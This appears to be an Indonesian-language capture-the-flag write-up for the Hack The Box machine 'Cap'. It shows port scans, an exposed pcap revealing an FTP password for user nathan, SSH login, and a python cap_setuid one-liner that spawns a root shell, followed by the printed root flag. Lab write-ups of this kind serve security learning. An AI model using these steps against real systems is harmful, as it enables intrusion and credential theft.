# Information Gathering
## Nmap Scan
```
┌──(me㉿justakazh)-[~/htb/HTB_Machine/linux]
└─$ nmap -p- 10.10.10.245 --min-rate 1000 
Nmap scan report for 10.10.10.245 (10.10.10.245)
Host is up (0.042s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 73.61 seconds

┌──(me㉿justakazh)-[~/htb/HTB_Machine/linux/cap]
└─$ sudo nmap -p21,22,80 -sV -sS 10.10.10.245
[sudo] password for me: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-29 13:32 WIB
Stats: 0:01:58 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 96.97% done; ETC: 13:34 (0:00:00 remaining)
Stats: 0:02:00 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 96.97% done; ETC: 13:34 (0:00:00 remaining)
Nmap scan report for 10.10.10.245 (10.10.10.245)
Host is up (0.21s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    gunicorn
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port80-TCP:V=7.94SVN%I=7%D=12/29%Time=6770ECEF%P=x86_64-pc-linux-gnu%r(
SF:GetRequest,4C56,"HTTP/1\.0\x20200\x20OK\r\nServer:\x20gunicorn\r\nDate:
SF:\x20Sun,\x2029\x20Dec\x202024\x2006:17:16\x20GMT\r\nConnection:\x20clos
SF:e\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x2
SF:019386\r\n\r\n<!DOCTYPE\x20html>\n<html\x20class=\"no-js\"\x20lang=\"en
SF:\">\n\n<head>\n\x20\x20\x20\x20<meta\x20charset=\"utf-8\">\n\x20\x20\x2
SF:0\x20<meta\x20http-equiv=\"x-ua-compatible\"\x20content=\"ie=edge\">\n\
SF:x20\x20\x20\x20<title>Security\x20Dashboard</title>\n\x20\x20\x20\x20<m
SF:eta\x20name=\"viewport\"\x20content=\"width=device-width,\x20initial-sc
SF:ale=1\">\n\x20\x20\x20\x20<link\x20rel=\"shortcut\x20icon\"\x20type=\"i
SF:mage/png\"\x20href=\"/static/images/icon/favicon\.ico\">\n\x20\x20\x20\
SF:x20<link\x20rel=\"stylesheet\"\x20href=\"/static/css/bootstrap\.min\.cs
SF:s\">\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"/static/css
SF:/font-awesome\.min\.css\">\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"
SF:\x20href=\"/static/css/themify-icons\.css\">\n\x20\x20\x20\x20<link\x20
SF:rel=\"stylesheet\"\x20href=\"/static/css/metisMenu\.css\">\n\x20\x20\x2
SF:0\x20<link\x20rel=\"stylesheet\"\x20href=\"/static/css/owl\.carousel\.m
SF:in\.css\">\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"/stat
SF:ic/css/slicknav\.min\.css\">\n\x20\x20\x20\x20<!--\x20amchar")%r(HTTPOp
SF:tions,B3,"HTTP/1\.0\x20200\x20OK\r\nServer:\x20gunicorn\r\nDate:\x20Sun
SF:,\x2029\x20Dec\x202024\x2006:17:16\x20GMT\r\nConnection:\x20close\r\nCo
SF:ntent-Type:\x20text/html;\x20charset=utf-8\r\nAllow:\x20HEAD,\x20GET,\x
SF:20OPTIONS\r\nContent-Length:\x200\r\n\r\n")%r(RTSPRequest,121,"HTTP/1\.
SF:1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\nContent-Type:\x20
SF:text/html\r\nContent-Length:\x20196\r\n\r\n<html>\n\x20\x20<head>\n\x20
SF:\x20\x20\x20<title>Bad\x20Request</title>\n\x20\x20</head>\n\x20\x20<bo
SF:dy>\n\x20\x20\x20\x20<h1><p>Bad\x20Request</p></h1>\n\x20\x20\x20\x20In
SF:valid\x20HTTP\x20Version\x20&#x27;Invalid\x20HTTP\x20Version:\x20&#x27;
SF:RTSP/1\.0&#x27;&#x27;\n\x20\x20</body>\n</html>\n")%r(FourOhFourRequest
SF:,189,"HTTP/1\.0\x20404\x20NOT\x20FOUND\r\nServer:\x20gunicorn\r\nDate:\
SF:x20Sun,\x2029\x20Dec\x202024\x2006:17:21\x20GMT\r\nConnection:\x20close
SF:\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x20
SF:232\r\n\r\n<!DOCTYPE\x20HTML\x20PUBLIC\x20\"-//W3C//DTD\x20HTML\x203\.2
SF:\x20Final//EN\">\n<title>404\x20Not\x20Found</title>\n<h1>Not\x20Found<
SF:/h1>\n<p>The\x20requested\x20URL\x20was\x20not\x20found\x20on\x20the\x2
SF:0server\.\x20If\x20you\x20entered\x20the\x20URL\x20manually\x20please\x
SF:20check\x20your\x20spelling\x20and\x20try\x20again\.</p>\n");
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 139.99 seconds

```


# Getting User Flag

## Crendential in pcap file
saya mencoba untuk mengakses http://10.10.10.245/ dan saya mendapatkan tampilan dashboard seperti berikut ini
![[Pasted image 20241229142046.png]]

Pada side menu di sebelah kiri, terdapat 4 menu:

- **Dashboard**: Menampilkan grafik events.
- **Security Snapshot (5 Second PCAP + Analysis)**: Menjalankan capture traffic.
- **IP Config**: Menampilkan interface dan IP, mirip dengan perintah `ifconfig` pada terminal.
- **Network Status**: Menampilkan daftar jaringan yang terhubung, serupa dengan output dari `ss -tupln` atau `netstat`.

Di sini, saya mencoba mengakses **Security Snapshot (5 Second PCAP + Analysis)** dan diarahkan ke http://10.10.10.245/data/1. Hal yang menarik adalah ketika saya mengganti ID pada URL ke 2, 3, 4, dan seterusnya, saya justru diarahkan kembali ke http://10.10.10.245. Kemudian, setelah saya mencoba mengklik lagi menu **Security Snapshot (5 Second PCAP + Analysis)**, saya dapat mengakses http://10.10.10.245/data/2. Seperti yang tercermin pada nama menu tersebut, sepertinya setiap nomor data mewakili data baru yang diperbarui setiap 5 detik setiap kali menu ini diklik.

Saya sempat terjebak lama di sini, hingga akhirnya saya mencoba memasukkan ID dengan nilai 0. Setelah itu, saya mendapatkan file pcap yang berisi request FTP dari user **nathan**.

![[Pasted image 20241229143040.png]]

buka file 0.pcap pada wireshark dan kita akan mendapatkan user dan password tersebut

![["Pasted image 20241229143157.png"]]

![[Pasted image 20241229143305.png]]

```
user:Buck3tH4TF0RM3!
```

### FTP Login
```
ftp 10.10.10.245 
Connected to 10.10.10.245.
220 (vsFTPd 3.0.3)
Name (10.10.10.245:me): nathan
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
229 Entering Extended Passive Mode (|||51614|)
150 Here comes the directory listing.
-r--------    1 1001     1001           33 Dec 29 07:04 user.txt
226 Directory send OK.
ftp> 
```

### SSH Login
```
┌──(me㉿justakazh)-[~/htb/HTB_Machine/linux/cap]
└─$ ssh nathan@10.10.10.245 
nathan@10.10.10.245's password: 
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)
[--- SNIP ---]
nathan@cap:~$ ls
user.txt                                    
nathan@cap:~$ cat user.txt                                  
65041xxxxxxxxxxxxxxxxxxx1531
```

# Getting Root Flag
## Capabilities (Linpeas)

![[Pasted image 20241229153703.png]]
setelah melakukan enumerasi menggunakan linpeas, disini saya mendapatkan `/usr/bin/python3.8`  memiliki capability  `cap_setuid` yang berarti kita dapat melakukan melakukan penyalah gunakaan capability tersebut dengan bersumber perintah untuk melakukan exploitasi dari gtfobins berikut 

- https://gtfobins.github.io/gtfobins/python/#capabilities

```
nathan@cap:/tmp$ python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
# id
uid=0(root) gid=1001(nathan) groups=1001(nathan)
# cat /root/root.txt
376c3c628849037ce15418c1928db22d
#
```

dan kita berhasil mendapatkan root.
